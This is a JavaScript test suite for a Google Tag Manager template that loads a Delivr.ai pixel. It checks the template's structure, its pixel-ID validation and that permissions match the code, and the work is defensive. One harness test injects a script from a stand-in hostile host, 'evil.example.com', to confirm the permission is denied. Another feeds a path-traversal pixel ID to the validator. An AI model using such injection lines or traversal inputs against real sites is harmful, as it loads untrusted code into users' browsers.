import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { describe, it } from 'node:test';
import { parse as parseYaml } from 'yaml';

import { API_PERMISSION, APIS, parsePermissions, parseSections, runScenario } from './gtm-runtime.mjs';

const root = new URL('../', import.meta.url);
const text = readFileSync(new URL('template.tpl', root), 'utf8');
const sections = parseSections(text);
const info = JSON.parse(sections.INFO);
const params = JSON.parse(sections.TEMPLATE_PARAMETERS);
const code = sections.SANDBOXED_JS_FOR_WEB_TEMPLATE;
const permissions = parsePermissions(sections.WEB_PERMISSIONS);
const tests = parseYaml(sections.TESTS);

const GALLERY_CATEGORIES = new Set([
  'ADVERTISING', 'AFFILIATE_MARKETING', 'ANALYTICS', 'ATTRIBUTION', 'CHAT', 'CONVERSIONS', 'DATA_WAREHOUSING',
  'EMAIL_MARKETING', 'EXPERIMENTATION', 'HEAT_MAP', 'LEAD_GENERATION', 'MARKETING', 'PERSONALIZATION',
  'REMARKETING', 'SALES', 'SESSION_RECORDING', 'SOCIAL', 'SURVEY', 'TAG_MANAGEMENT', 'UTILITY',
]);

const param = (name) => params.find((p) => p.name === name);
const required = [...code.matchAll(/require\('([^']+)'\)/g)].map((m) => m[1]);

describe('template structure', () => {
  it('has every section GTM exports, in order', () => {
    const order = [...text.matchAll(/^___([A-Z_]+)___$/gm)].map((m) => m[1]);
    assert.deepEqual(order, [
      'TERMS_OF_SERVICE', 'INFO', 'TEMPLATE_PARAMETERS', 'SANDBOXED_JS_FOR_WEB_TEMPLATE', 'WEB_PERMISSIONS', 'TESTS', 'NOTES',
    ]);
  });

  it('declares a web tag with one to three gallery categories', () => {
    assert.equal(info.type, 'TAG');
    assert.deepEqual(info.containerContexts, ['WEB']);
    assert.ok(info.categories.length >= 1 && info.categories.length <= 3);
    for (const c of info.categories) assert.ok(GALLERY_CATEGORIES.has(c), `unsupported category ${c}`);
    assert.match(info.brand.thumbnail, /^data:image\/png;base64,[A-Za-z0-9+/]+=*$/);
  });

  it('has unique parameter names and select defaults among their items', () => {
    const names = params.map((p) => p.name);
    assert.equal(new Set(names).size, names.length);
    for (const p of params.filter((p) => p.type === 'SELECT')) {
      assert.ok(p.selectItems.some((i) => i.value === p.defaultValue), `${p.name} default is not an item`);
    }
  });

  it('accepts a pixel UUID and rejects anything else', () => {
    const regex = new RegExp(param('pixelId').valueValidators.find((v) => v.type === 'REGEX').args[0]);
    assert.ok(regex.test('6f01f886-7e01-4f4b-8c78-09051afd02c7'));
    for (const bad of ['', 'not-a-uuid', '6f01f886-7e01-4f4b-8c78-09051afd02c7/../x', ' 6f01f886-7e01-4f4b-8c78-09051afd02c7']) {
      assert.ok(!regex.test(bad), `accepted ${JSON.stringify(bad)}`);
    }
  });
});

describe('permissions match the code', () => {
  it('declares a permission for every API the code requires', () => {
    for (const api of required) {
      assert.ok(api in APIS, `unsupported API ${api}`);
      const needed = API_PERMISSION[api];
      if (needed) assert.ok(permissions[needed], `${api} needs ${needed}`);
    }
  });

  it('declares no permission the code does not use', () => {
    const used = new Set(required.map((api) => API_PERMISSION[api]).filter(Boolean));
    assert.deepEqual(Object.keys(permissions).sort(), [...used].sort());
  });

  it('can inject the pixel from the Delivr CDN and from nothing else', () => {
    assert.deepEqual(permissions.inject_script.urls, ['https://cdn.delivr.ai/pixels/*']);
    assert.ok(code.includes("'https://cdn.delivr.ai/pixels/'"));
  });

  it('reads exactly the selectable consent types and writes none', () => {
    const selectable = param('consentType').selectItems.map((i) => i.value).sort();
    const declared = permissions.access_consent.consentTypes;
    assert.deepEqual(declared.map((c) => c.consentType).sort(), selectable);
    for (const c of declared) assert.deepEqual([c.read, c.write], [true, false]);
  });

  it('writes and executes only the window globals the code uses', () => {
    const executed = [...code.matchAll(/callInWindow\('([^']+)'/g)].map((m) => m[1]);
    const written = [...code.matchAll(/setInWindow\('([^']+)'/g)].map((m) => m[1]);
    const expected = [
      ...[...new Set(written)].map((key) => [key, false, true, false]),
      ...[...new Set(executed)].map((key) => [key, false, false, true]),
    ];
    const declared = permissions.access_globals.keys.map((k) => [k.key, k.read, k.write, k.execute]);
    assert.deepEqual(declared.sort(), expected.sort());
  });

  it('logs only in debug mode', () => {
    assert.equal(permissions.logging.environments, 'debug');
  });
});

describe('template scenarios', () => {
  assert.ok(tests.scenarios.length > 0);
  for (const scenario of tests.scenarios) {
    it(scenario.name, () => {
      runScenario({ code, permissions, scenarioCode: scenario.code, setupCode: tests.setup });
    });
  }
});

describe('the harness itself', () => {
  it('fails a scenario that injects outside the declared hosts', () => {
    assert.throws(
      () =>
        runScenario({
          code: "require('injectScript')('https://evil.example.com/p.js', data.gtmOnSuccess, data.gtmOnFailure);",
          permissions,
          scenarioCode: 'runCode({});',
        }),
      /permission denied: inject_script/,
    );
  });

  it('fails a scenario whose assertion does not hold', () => {
    assert.throws(
      () => runScenario({ code: 'data.gtmOnSuccess();', permissions, scenarioCode: "runCode({}); assertApi('gtmOnFailure').wasCalled();" }),
      /expected gtmOnFailure to be called/,
    );
  });
});

describe('gallery files', () => {
  it('ships the Apache 2.0 license with the copyright line filled in', () => {
    const license = readFileSync(new URL('LICENSE', root), 'utf8');
    assert.match(license, /Apache License\s+Version 2\.0, January 2004/);
    assert.match(license, /Copyright \d{4} Delivr\.ai/);
    assert.doesNotMatch(license, /\[yyyy\]/);
  });
});
